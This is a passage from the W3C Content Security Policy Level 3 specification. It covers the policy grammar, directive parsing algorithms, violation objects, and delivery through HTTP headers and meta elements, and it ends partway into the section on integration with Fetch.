
## 1. Introduction

*This section is not normative.*

This document defines [Content Security Policy] (CSP), a tool which
developers can use to lock down their applications in various ways,
mitigating the risk of content injection vulnerabilities such as
cross-site scripting, and reducing the privilege with which their
applications execute.

CSP is not intended as a first line of defense against content injection
vulnerabilities. Instead, CSP is best used as defense-in-depth. It
reduces the harm that a malicious injection can cause, but it is not a
replacement for careful input validation and output encoding.

This document is an iteration on Content Security Policy Level 2, with
the goal of more clearly explaining the interactions between CSP, HTML,
and Fetch on the one hand, and providing clear hooks for modular
extensibility on the other. Ideally, this will form a stable core upon
which we can build new functionality.

### 1.1. Examples

#### 1.1.1. Control Execution

MegaCorp Inc's developers want to
protect themselves against cross-site scripting attacks. They can
mitigate the risk of script injection by ensuring that their trusted CDN
is the only origin from which script can load and execute. Moreover,
they wish to ensure that no plugins can execute in their pages\'
contexts. The following policy has that effect:

 Content-Security-Policy: script-src https://cdn.example.com/scripts/; object-src 'none'

### 1.2. Goals

Content Security Policy aims to do to a few related things:

1. Mitigate the risk of content-injection attacks by giving developers
 fairly granular control over

 - The resources which can be requested (and subsequently embedded or
 executed) on behalf of a specific
 [`Document`](https://dom.spec.whatwg.org/#document) or
 [`Worker`](https://html.spec.whatwg.org/multipage/workers.html#worker)

 - The execution of inline script

 - Dynamic code execution (via
 [`eval()`](https://tc39.github.io/ecma262#sec-eval-x) and similar constructs)

 - The application of inline style

2. Mitigate the risk of attacks which require a resource to be embedded
 in a malicious context (the \"Pixel Perfect\" attack described in
 [\[TIMING\]](#biblio-timing "Pixel Perfect Timing Attacks"),
 for example) by giving developers granular control over the origins
 which can embed a given resource.

3. Provide a policy framework which allows developers to reduce the
 privilege of their applications.

4. Provide a reporting mechanism which allows developers to detect
 flaws being exploited in the wild.

### 1.3. Changes from Level 2

This document describes an evolution of the Content Security Policy
Level 2 specification
[\[CSP2\]](#biblio-csp2 "Content Security Policy Level 2").
The following is a high-level overview of the changes:

1. The specification has been rewritten from the ground up in terms of
 the [\[FETCH\]](#biblio-fetch "Fetch Standard")
 specification, which should make it simpler to integrate CSP's
 requirements and restrictions with other specifications (and with
 Service Workers in particular).

2. The `child-src` model has been substantially altered:

 1. The `frame-src` directive, which was deprecated in CSP Level 2,
 has been undeprecated, but continues to defer to `child-src` if
 not present (which defers to `default-src` in turn).

 2. A `worker-src` directive has been added, deferring to
 `child-src` if not present (which likewise defers to
 `script-src` and eventually `default-src`).

3. The URL matching algorithm now treats insecure schemes and ports as
 matching their secure variants. That is, the source expression
 `http://example.com:80` will match both `http://example.com:80` and
 `https://example.com:443`.

 Likewise, `'self'` now matches `https:` and `wss:` variants of the
 page's origin, even on pages whose scheme is `http`.

4. Violation reports generated from inline script or style will now
 report \"`inline`\" as the blocked resource. Likewise, blocked
 `eval()` execution will report \"`eval`\" as the blocked resource.

5. The `manifest-src` directive has been added.

6. The `report-uri` directive is deprecated in favor of the new
 `report-to` directive, which relies on
 [\[REPORTING\]](#biblio-reporting "Reporting API")
 as infrastructure.

7. The `'strict-dynamic'` source expression will now allow script which
 executes on a page to load more script via
 non-[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted)
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements. Details are in [§ 8.2 Usage of
 \"\'strict-dynamic\'\"](#strict-dynamic-usage).

8. The `'unsafe-hashes'` source expression will now allow event
 handlers, style attributes and `javascript:` navigation targets to
 match hashes. Details in [§ 8.3 Usage of
 \"\'unsafe-hashes\'\"](#unsafe-hashes-usage).

9. The [source
 expression](#source-expression) matching has been changed to require explicit
 presence of any non-[HTTP(S)
 scheme](https://fetch.spec.whatwg.org/#http-scheme), rather than [local
 scheme](https://fetch.spec.whatwg.org/#local-scheme), unless that non-[HTTP(S)
 scheme](https://fetch.spec.whatwg.org/#http-scheme) is the same as the scheme of protected resource, as
 described in [§ 6.7.2.8 Does url match expression in origin with
 redirect
 count?](#match-url-to-source-expression).

10. Hash-based source expressions may now match external scripts if the
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element that triggers the request specifies a
 set of integrity metadata which is listed in the current policy.
 Details in [§ 8.4 Allowing external JavaScript via
 hashes](#external-hash).

11. Reports generated for inline violations will contain a
 [sample](#violation-sample) attribute if the relevant directive contains the
 [`'report-sample'`](#grammardef-report-sample) expression.

## 2. Framework

### 2.1. Infrastructure

This document uses ABNF grammar to specify syntax, as defined in
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF").
It also relies on the `#rule` ABNF extension defined in [Section
5.6.1](https://tools.ietf.org/html/rfc9110#section-5.6.1) of
[\[RFC9110\]](#biblio-rfc9110 "HTTP Semantics"),
with the modification that
[OWS](https://tools.ietf.org/html/rfc9110#section-5.6.3) is replaced with
[optional-ascii-whitespace](#grammardef-optional-ascii-whitespace). That is, the `#rule` used in this document is
defined as:

 1#element => element *( optional-ascii-whitespace "," optional-ascii-whitespace element )

and for n \>= 1 and m \> 1:

 <n>#<m>element => element <n-1>*<m-1>( optional-ascii-whitespace "," optional-ascii-whitespace element )

This document depends on the Infra Standard for a number of foundational
concepts used in its algorithms and prose
[\[INFRA\]](#biblio-infra "Infra Standard").

The following definitions are used to improve readability of other
definitions in this document.

 optional-ascii-whitespace = *( %x09 / %x0A / %x0C / %x0D / %x20 )
 required-ascii-whitespace = 1*( %x09 / %x0A / %x0C / %x0D / %x20 )
 ; These productions match the definition of ASCII whitespace from the INFRA standard.

### 2.2. Policies

A [policy] defines allowed and restricted
behaviors, and may be applied to a
[`Document`](https://dom.spec.whatwg.org/#document),
[`WorkerGlobalScope`](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope), or
[`WorkletGlobalScope`](https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope).

Each policy has an associated [directive set], which is an
[ordered
set](https://infra.spec.whatwg.org/#ordered-set) of [directives](#directives) that define the policy's implications when applied.

Each policy has an associated [disposition], which is either
\"`enforce`\" or \"`report`\".

Each policy has an associated [source], which is either \"`header`\"
or \"`meta`\".

Each policy has an associated [self-origin], which is an
[origin](https://html.spec.whatwg.org/#concept-origin) that is used when matching the
[`'self'`](#grammardef-self) keyword.

 This is needed to facilitate the
[`'self'`](#grammardef-self) checks of [local
scheme](https://fetch.spec.whatwg.org/#local-scheme) documents/workers that have inherited their policy but
have an [opaque
origin](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque). Most of the time this will simply be the [environment
settings
object](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object)'s
[origin](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin).

Multiple
[policies](#content-security-policy-object) can be applied to a single resource, and are collected
into a [list](https://infra.spec.whatwg.org/#list) of
[policies](#content-security-policy-object) known as a [CSP list].

A [CSP list](#csp-list) [contains a
header-delivered Content Security
Policy] if it
[contains](https://infra.spec.whatwg.org/#list-contain) a
[policy](#content-security-policy-object) whose [source](#policy-source) is \"`header`\".

A [serialized CSP] is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) consisting of a semicolon-delimited series of
[serialized
directives](#serialized-directive), adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 serialized-policy =
 serialized-directive *( optional-ascii-whitespace ";" [ optional-ascii-whitespace serialized-directive ] )

A [serialized CSP list] is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) consisting of a comma-delimited series of [serialized
CSPs](#serialized-csp),
adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 serialized-policy-list = 1#serialized-policy
 ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
 ; but it incorporates the modifications specified
 ; in section 2.1 of this document.

#### 2.2.1. Parse a serialized CSP

To [parse a serialized CSP], given a [byte
sequence](https://infra.spec.whatwg.org/#byte-sequence) or
[string](https://infra.spec.whatwg.org/#string) `serialized`, a
[source](#policy-source)
`source`, and a
[disposition](#policy-disposition) `disposition`, execute the following steps.

This algorithm returns a [Content Security Policy
object](#content-security-policy-object). If `serialized` could not be parsed, the
object's [directive
set](#policy-directive-set) will be empty.

1. If `serialized` is a [byte
 sequence](https://infra.spec.whatwg.org/#byte-sequence), then set `serialized` to be the result
 of [isomorphic
 decoding](https://infra.spec.whatwg.org/#isomorphic-decode) `serialized`.

2. Let `policy` be a new
 [policy](#content-security-policy-object) with an empty [directive
 set](#policy-directive-set), a [source](#policy-source) of `source`, and a
 [disposition](#policy-disposition) of `disposition`.

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `token` returned by [strictly
 splitting](https://infra.spec.whatwg.org/#strictly-split) `serialized` on the U+003B SEMICOLON
 character (`;`):

 1. [Strip leading and trailing ASCII
 whitespace](https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace) from `token`.

 2. If `token` is an empty string, or if
 `token` is not an [ASCII
 string](https://infra.spec.whatwg.org/#ascii-string),
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 3. Let `directive name` be the result of [collecting a
 sequence of code
 points](https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points) from `token` which are not [ASCII
 whitespace](https://infra.spec.whatwg.org/#ascii-whitespace).

 4. Set `directive name` to be the result of running
 [ASCII
 lowercase](https://infra.spec.whatwg.org/#ascii-lowercase) on `directive name`.

 Directive names are case-insensitive, that is:
 `script-SRC 'none'` and `ScRiPt-sRc 'none'` are equivalent.

 5. If `policy`'s [directive
 set](#policy-directive-set) contains a
 [directive](#directives)
 whose [name](#directive-name) is `directive name`,
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 In this case, the user agent SHOULD notify
 developers that a duplicate directive was ignored. A console
 warning might be appropriate, for example.

 6. Let `directive value` be the result of [splitting
 `token` on ASCII
 whitespace](https://infra.spec.whatwg.org/#split-on-ascii-whitespace).

 7. Let `directive` be a new
 [directive](#directives)
 whose [name](#directive-name) is `directive name`, and
 [value](#directive-value) is `directive value`.

 8. [Append](https://infra.spec.whatwg.org/#set-append) `directive` to `policy`'s
 [directive
 set](#policy-directive-set).

4. Return `policy`.

#### 2.2.2. Parse `response`'s Content Security Policies

To [parse a response's Content Security
Policies] given a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, execute the following steps.

This algorithm returns a
[list](https://infra.spec.whatwg.org/#list) of [Content Security Policy
objects](#content-security-policy-object). If the policies cannot be parsed, the returned list
will be empty.

1. Let `policies` be an empty
 [list](https://infra.spec.whatwg.org/#list).

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `token` returned by [extracting header
 list
 values](https://fetch.spec.whatwg.org/#extract-header-list-values) given `Content-Security-Policy` and
 `response`'s [header
 list](https://fetch.spec.whatwg.org/#concept-response-header-list):

 1. Let `policy` be the result of
 [parsing](#abstract-opdef-parse-a-serialized-csp) `token`, with a
 [source](#policy-source) of \"`header`\", and a
 [disposition](#policy-disposition) of \"`enforce`\".

 2. If `policy`'s [directive
 set](#policy-directive-set) is not empty, append `policy` to
 `policies`.

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `token` returned by [extracting header
 list
 values](https://fetch.spec.whatwg.org/#extract-header-list-values) given `Content-Security-Policy-Report-Only` and
 `response`'s [header
 list](https://fetch.spec.whatwg.org/#concept-response-header-list):

 1. Let `policy` be the result of
 [parsing](#abstract-opdef-parse-a-serialized-csp) `token`, with a
 [source](#policy-source) of \"`header`\", and a
 [disposition](#policy-disposition) of \"`report`\".

 2. If `policy`'s [directive
 set](#policy-directive-set) is not empty, append `policy` to
 `policies`.

4. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `policies`:

 1. Set `policy`'s
 [self-origin](#policy-self-origin) to `response`'s
 [url](https://fetch.spec.whatwg.org/#concept-response-url)'s
 [origin](https://url.spec.whatwg.org/#concept-url-origin).

5. Return `policies`.

 When [parsing a response's Content Security
Policies](#abstract-opdef-parse-a-responses-content-security-policies), if the resulting `policies` end up
containing at least one item, user agents can hold a flag on
`policies` and use it to optimize away the [contains a
header-delivered Content Security
Policy](#contains-a-header-delivered-content-security-policy) algorithm.

### 2.3. Directives

Each
[policy](#content-security-policy-object) contains an [ordered
set](https://infra.spec.whatwg.org/#ordered-set) of [directives] (its [directive
set](#policy-directive-set)), each of which controls a specific behavior. The
directives defined in this document are described in detail in [§ 6
Content Security Policy Directives](#csp-directives).

Each [directive](#directives) is a
[name] / [value] pair. The
[name](#directive-name) is a
non-empty
[string](https://infra.spec.whatwg.org/#string), and the
[value](#directive-value) is
a
[set](https://infra.spec.whatwg.org/#ordered-set) of non-empty
[strings](https://infra.spec.whatwg.org/#string). The
[value](#directive-value) MAY
be
[empty](https://infra.spec.whatwg.org/#list-is-empty).

A [serialized directive] is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string), consisting of one or more whitespace-delimited tokens,
and adhering to the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 serialized-directive = directive-name [ required-ascii-whitespace directive-value ]
 directive-name = 1*( ALPHA / DIGIT / "-" )
 directive-value = *( required-ascii-whitespace / ( %x21-%x2B / %x2D-%x3A / %x3C-%x7E ) )
 ; Directive values may contain whitespace and VCHAR characters,
 ; excluding ";" and ",". The second half of the definition
 ; above represents all VCHAR characters (%x21-%x7E)
 ; without ";" and "," (%x3B and %x2C respectively)

 ; ALPHA, DIGIT, and VCHAR are defined in Appendix B.1 of RFC 5234.

[Directives](#directives) have a
number of associated algorithms:

1. A [pre-request check], which takes a
 [request](https://fetch.spec.whatwg.org/#concept-request) and a
 [policy](#content-security-policy-object) as an argument, and is executed during [§ 4.1.2
 Should request be blocked by Content Security
 Policy?](#should-block-request). This
 algorithm returns \"`Allowed`\" unless otherwise specified.

2. A [post-request check], which
 takes a
 [request](https://fetch.spec.whatwg.org/#concept-request), a
 [response](https://fetch.spec.whatwg.org/#concept-response), and a
 [policy](#content-security-policy-object) as arguments, and is executed during [§ 4.1.3
 Should response to request be blocked by Content Security
 Policy?](#should-block-response).
 This algorithm returns \"`Allowed`\" unless otherwise specified.

3. An [inline check], which takes an
 [`Element`](https://dom.spec.whatwg.org/#element), a type string, a
 [policy](#content-security-policy-object), and a source string as arguments, and is executed
 during [§ 4.2.3 Should element's inline type behavior be blocked by
 Content Security
 Policy?](#should-block-inline) and
 during [§ 4.2.4 Should navigation request of type be blocked by
 Content Security
 Policy?](#should-block-navigation-request)
 for `javascript:` requests. This algorithm returns \"`Allowed`\"
 unless otherwise specified.

4. An [initialization], which takes a
 [`Document`](https://dom.spec.whatwg.org/#document) or [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) and a
 [policy](#content-security-policy-object) as arguments. This algorithm is executed during
 [§ 4.2.1 Run CSP initialization for a
 Document](#run-document-csp-initialization)
 and [§ 4.2.6 Run CSP initialization for a global
 object](#run-global-object-csp-initialization).
 Unless otherwise specified, it has no effect and it returns
 \"`Allowed`\".

5. A [pre-navigation check], which
 takes a
 [request](https://fetch.spec.whatwg.org/#concept-request), a navigation type string (\"`form-submission`\" or
 \"`other`\"), and a
 [policy](#content-security-policy-object) as arguments, and is executed during [§ 4.2.4
 Should navigation request of type be blocked by Content Security
 Policy?](#should-block-navigation-request).
 It returns \"`Allowed`\" unless otherwise specified.

6. A [navigation response check],
 which takes a
 [request](https://fetch.spec.whatwg.org/#concept-request), a navigation type string (\"`form-submission`\" or
 \"`other`\"), a
 [response](https://fetch.spec.whatwg.org/#concept-response), a
 [navigable](https://html.spec.whatwg.org/#navigable), a check type string (\"`source`\" or
 \"`response`\"), and a
 [policy](#content-security-policy-object) as arguments, and is executed during [§ 4.2.5
 Should navigation response to navigation request of type in target
 be blocked by Content Security
 Policy?](#should-block-navigation-response).
 It returns \"`Allowed`\" unless otherwise specified.

7. A [webrtc pre-connect check],
 which takes a
 [policy](#content-security-policy-object), and is executed during [§ 4.3.1 Should RTC
 connections be blocked for global?](#should-block-rtc-connection).
 It returns \"`Allowed`\" unless otherwise specified.

#### 2.3.1. Source Lists

Many [directives](#directives)\'
[value](#directive-value)
consist of [source lists]:
[sets](https://infra.spec.whatwg.org/#ordered-set) of
[strings](https://infra.spec.whatwg.org/#string) which identify content that can be fetched and
potentially embedded or executed. Each
[string](https://infra.spec.whatwg.org/#string) represents one of the following types of [source
expression]:

1. Keywords such as
 [`'none'`](#grammardef-none) and
 [`'self'`](#grammardef-self) (which match nothing and the current URL's
 origin, respectively)

2. Serialized URLs such as `https://example.com/path/to/file.js` (which
 matches a specific file) or `https://example.com/` (which matches
 everything on that origin)

3. Schemes such as `https:` (which matches any resource having the
 specified scheme)

4. Hosts such as `example.com` (which matches any resource on the host,
 regardless of scheme) or `*.example.com` (which matches any resource
 on the host's subdomains (and any of its subdomains\' subdomains,
 and so on))

5. Nonces such as `'nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA'` (which can
 match specific elements on a page)

6. Digests such as `'sha256-abcd...'` (which can match specific
 elements on a page)

A [serialized source list] is an [ASCII
string](https://infra.spec.whatwg.org/#ascii-string), consisting of a whitespace-delimited series of [source
expressions](#source-expression), adhering to the following ABNF grammar
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 serialized-source-list = ( source-expression *( required-ascii-whitespace source-expression ) ) / "'none'"
 source-expression = scheme-source / host-source / keyword-source
 / nonce-source / hash-source

 ; Schemes: "https:" / "custom-scheme:" / "another.custom-scheme:"
 scheme-source = scheme-part ":"

 ; Hosts: "example.com" / "*.example.com" / "https://*.example.com:12/path/to/file.js"
 host-source = [ scheme-part "://" ] host-part [ ":" port-part ] [ path-part ]
 scheme-part = scheme
 ; scheme is defined in section 3.1 of RFC 3986.
 host-part = "*" / [ "*." ] 1*host-char *( "." 1*host-char ) [ "." ]
 host-char = ALPHA / DIGIT / "-"
 port-part = 1*DIGIT / "*"
 path-part = path-absolute (but not including ";" or ",")
 ; path-absolute is defined in section 3.3 of RFC 3986.

 ; Keywords:
 keyword-source = "'self'" / "'unsafe-inline'" / "'unsafe-eval'"
 / "'strict-dynamic'" / "'unsafe-hashes'"
 / "'report-sample'" / "'unsafe-allow-redirects'"
 / "'wasm-unsafe-eval'" / "'trusted-types-eval'"
 / "'report-sha256'" / "'report-sha384'"
 / "'report-sha512'"

 ISSUE: Bikeshed unsafe-allow-redirects.

 ; Nonces: 'nonce-[nonce goes here]'
 nonce-source = "'nonce-" base64-value "'"
 base64-value = 1*( ALPHA / DIGIT / "+" / "/" / "-" / "_" )*2( "=" )

 ; Digests: 'sha256-[digest goes here]'
 hash-source = "'" hash-algorithm "-" base64-value "'"
 hash-algorithm = "sha256" / "sha384" / "sha512"

The [host-char](#grammardef-host-char) production intentionally contains only ASCII
characters; internationalized domain names cannot be entered directly as
part of a [serialized CSP](#serialized-csp), but instead MUST be Punycode-encoded
[\[RFC3492\]](#biblio-rfc3492 "Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA)").
For example, the domain `üüüüüü.de` MUST be represented as
`xn--tdaaaaaa.de`.

 Though IP address do match the grammar above, only
`127.0.0.1` will actually match a URL when used in a source expression
(see [§ 6.7.2.7 Does url match source list in origin with redirect
count?](#match-url-to-source-list) for details). The security properties
of IP addresses are suspect, and authors ought to prefer hostnames
whenever possible.

 The
[base64-value](#grammardef-base64-value) grammar allows both
[base64](https://tools.ietf.org/html/rfc4648#section-4) and
[base64url](https://tools.ietf.org/html/rfc4648#section-5) encoding. These encodings are treated as equivalant
when processing
[hash-source](#grammardef-hash-source) values. Nonces, however, are strict string matches:
we use the
[base64-value](#grammardef-base64-value) grammar to limit the characters available, and
reduce the complexity for the server-side operator (encodings, etc), but
the user agent doesn't actually care about any underlying value, nor
does it do any decoding of the
[nonce-source](#grammardef-nonce-source) value.

### 2.4. Violations

A [violation]
represents an action or resource which goes against the set of
[policy](#content-security-policy-object) objects associated with a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object).

Each [violation](#violation) has a
[global object], which is the [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) whose
[policy](#content-security-policy-object) has been violated.

Each [violation](#violation) has a
[url] which is its [global
object](#violation-global-object)'s
[`URL`](https://url.spec.whatwg.org/#url).

Each [violation](#violation) has a
[status] which is a non-negative integer representing
the HTTP status code of the resource for which the global object was
instantiated.

Each [violation](#violation) has a
[resource], which is either null, \"`inline`\",
\"`eval`\", \"`wasm-eval`\", \"`trusted-types-policy`\",
\"`trusted-types-sink`\" or a
[`URL`](https://url.spec.whatwg.org/#url). It represents the resource which violated the policy.

 The value null for a
[violation](#violation)'s
[resource](#violation-resource) is only allowed while the
[violation](#violation) is being
populated. By the time the [violation](#violation) is reported and its
[resource](#violation-resource) is used for [obtaining the blocked
URI](#obtain-violation-blocked-uri), the
[violation](#violation)'s
[resource](#violation-resource) should be populated with a
[`URL`](https://url.spec.whatwg.org/#url) or one of the allowed strings.

Each [violation](#violation) has a
[referrer], which is either null, or a
[`URL`](https://url.spec.whatwg.org/#url). It represents the referrer of the resource whose
policy was violated.

Each [violation](#violation) has a
[policy], which is the
[policy](#content-security-policy-object) that has been violated.

Each [violation](#violation) has a
[disposition], which is the
[disposition](#policy-disposition) of the
[policy](#content-security-policy-object) that has been violated.

Each [violation](#violation) has
an [effective directive] which is a
non-empty string representing the
[directive](#directives) whose
enforcement caused the violation.

Each [violation](#violation) has a
[source file], which is either null or a
[`URL`](https://url.spec.whatwg.org/#url).

Each [violation](#violation) has a
[line number], which is a non-negative
integer.

Each [violation](#violation) has a
[column number], which is a non-negative
integer.

Each [violation](#violation) has a
[element], which is either null or an element.

Each [violation](#violation) has a
[sample], which is a string. It is the empty string
unless otherwise specified.

 A [violation](#violation)'s
[sample](#violation-sample)
will be populated with the first 40 characters of an inline script,
event handler, or style that caused an violation. Violations which stem
from an external file will not include a sample in the violation report.

#### 2.4.1. Create a violation object for `global`, `policy`, and `directive`

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) `global`, a
[policy](#content-security-policy-object) `policy`, and a
[string](https://infra.spec.whatwg.org/#string) `directive`, the following algorithm creates
a new [violation](#violation)
object, and populates it with an initial set of data:

1. Let `violation` be a new
 [violation](#violation) whose
 [global
 object](#violation-global-object) is `global`,
 [policy](#violation-policy) is `policy`, [effective
 directive](#violation-effective-directive) is `directive`, and
 [resource](#violation-resource) is null.

2. If the user agent is currently executing script, and can extract a
 source file's URL, line number, and column number from the
 `global`, set `violation`'s [source
 file](#violation-source-file), [line
 number](#violation-line-number), and [column
 number](#violation-column-number) accordingly.

 (#issue-ee968c9a) Is this kind of thing specified
 anywhere? I didn't see anything that looked useful in
 [\[ECMA262\]](#biblio-ecma262 "ECMAScript® Language Specification").

 User agents need to ensure that the [source
 file](#violation-source-file) is the URL requested by the page, pre-redirects. If
 that's not possible, user agents need to strip the URL down to an
 origin to avoid unintentional leakage.

3. If `global` is a
 [`Window`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window) object, set `violation`'s
 [referrer](#violation-referrer) to `global`'s
 [document](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window)'s
 [`referrer`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer).

4. Set `violation`'s
 [status](#violation-status) to the HTTP status code for the resource associated
 with `violation`'s [global
 object](#violation-global-object).

 (#issue-d43ce829) How, exactly, do we get the status
 code? We don't actually store it anywhere.

5. Return `violation`.

#### 2.4.2. Create a violation object for `request`, and `policy`.

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[policy](#content-security-policy-object) `policy`, the following algorithm creates a
new [violation](#violation)
object, and populates it with an initial set of data:

1. Let `directive` be the result of executing [§ 6.8.1 Get
 the effective directive for
 request](#effective-directive-for-a-request) on
 `request`.

2. Let `violation` be the result of executing [§ 2.4.1
 Create a violation object for global, policy, and
 directive](#create-violation-for-global) on `request`'s
 [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global), `policy`, and `directive`.

3. Set `violation`'s
 [resource](#violation-resource) to `request`'s
 [url](https://fetch.spec.whatwg.org/#concept-request-url).

 We use `request`'s
 [url](https://fetch.spec.whatwg.org/#concept-request-url), and *not* its [current
 url](https://fetch.spec.whatwg.org/#concept-request-current-url), as the latter might contain information about
 redirect targets to which the page MUST NOT be given access.

4. Return `violation`.

## 3. Policy Delivery

A server MAY declare a
[policy](#content-security-policy-object) for a particular [resource
representation](https://tools.ietf.org/html/rfc9110#section-3.2) via an HTTP response header field whose value is a
[serialized CSP](#serialized-csp). This mechanism is defined in detail in [§ 3.1 The
Content-Security-Policy HTTP Response Header Field](#csp-header) and
[§ 3.2 The Content-Security-Policy-Report-Only HTTP Response Header
Field](#cspro-header), and the integration with Fetch and HTML is
described in [§ 4.1 Integration with Fetch](#fetch-integration) and
[§ 4.2 Integration with HTML](#html-integration).

A
[policy](#content-security-policy-object) may also be declared inline in an HTML document via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element's
[`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv) attribute, as described in [§ 3.3 The \<meta\>
element](#meta-element).

### 3.1. The `Content-Security-Policy` HTTP Response Header Field

The [`Content-Security-Policy`] HTTP response header
field is the preferred mechanism for delivering a policy from a server
to a client. The header's value is represented by the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 Content-Security-Policy = 1#serialized-policy
 ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
 ; but it incorporates the modifications specified
 ; in section 2.1 of this document.

Content-Security-Policy: script-src 'self';
 report-to csp-reporting-endpoint

A server MAY send different `Content-Security-Policy` header field
values with different
[representations](https://tools.ietf.org/html/rfc9110#section-3.2) of the same resource.

When the user agent receives a `Content-Security-Policy` header field,
it MUST
[parse](#abstract-opdef-parse-a-serialized-csp) and [enforce](#enforced) each [serialized
CSP](#serialized-csp) it
contains as described in [§ 4.1 Integration with
Fetch](#fetch-integration), [§ 4.2 Integration with
HTML](#html-integration).

### 3.2. The `Content-Security-Policy-Report-Only` HTTP Response Header Field

The
[`Content-Security-Policy-Report-Only`] HTTP response header
field allows web developers to experiment with policies by monitoring
(but not enforcing) their effects. The header's value is represented by
the following ABNF
[\[RFC5234\]](#biblio-rfc5234 "Augmented BNF for Syntax Specifications: ABNF"):

 Content-Security-Policy-Report-Only = 1#serialized-policy
 ; The '#' rule is the one defined in section 5.6.1 of RFC 9110
 ; but it incorporates the modifications specified
 ; in section 2.1 of this document.

This header field allows developers to piece together their security
policy in an iterative fashion, deploying a report-only policy based on
their best estimate of how their site behaves, watching for violation
reports, and then moving to an enforced policy once they've gained
confidence in that behavior.

Content-Security-Policy-Report-Only: script-src 'self';
 report-to csp-reporting-endpoint

A server MAY send different `Content-Security-Policy-Report-Only` header
field values with different
[representations](https://tools.ietf.org/html/rfc9110#section-3.2) of the same resource.

When the user agent receives a `Content-Security-Policy-Report-Only`
header field, it MUST
[parse](#abstract-opdef-parse-a-serialized-csp) and [monitor](#monitored) each [serialized
CSP](#serialized-csp) it
contains as described in [§ 4.1 Integration with
Fetch](#fetch-integration) and [§ 4.2 Integration with
HTML](#html-integration).

 The
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only) header is **not** supported inside a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element.

### 3.3. The `<meta>` element

A
[`Document`](https://dom.spec.whatwg.org/#document) may deliver a policy via one or more HTML
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) elements whose
[`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv) attributes are an [ASCII
case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string \"`Content-Security-Policy`\". For
example:

``` highlight
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

Implementation details can be found in HTML's [Content Security Policy
state](https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy) `http-equiv` processing instructions
[\[HTML\]](#biblio-html "HTML Standard").

 The
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only) header is *not* supported inside a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element. Neither are the `report-uri`,
`frame-ancestors`, and `sandbox` directives.

Authors are *strongly encouraged* to place
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) elements as early in the document as possible,
because policies in
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) elements are not applied to content which precedes
them. In particular, note that resources fetched or prefetched using the
`Link` HTTP response header field, and resources fetched or prefetched
using
[`link`](https://html.spec.whatwg.org/multipage/semantics.html#the-link-element) and
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements which precede a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta)-delivered policy will not be blocked.

 A policy specified via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element will be enforced along with any other
policies active for the protected resource, regardless of where they're
specified. The general impact of enforcing multiple policies is
described in [§ 8.1 The effect of multiple
policies](#multiple-policies).

 Modifications to the
[`content`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content) attribute of a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element after the element has been parsed will be
ignored.

## 4. Integrations

*This section is non-normative.*

This document defines a set of algorithms which are used in other
specifications in order to implement the functionality. These
integrations are outlined here for clarity, but those external documents
are the normative references which ought to be consulted for detailed
information.

### 4.1. Integration with Fetch

A number of [directives](#directives) control resource loading in one way or another. This
specification provides algorithms which allow Fetch to make decisions
about whether or not a particular
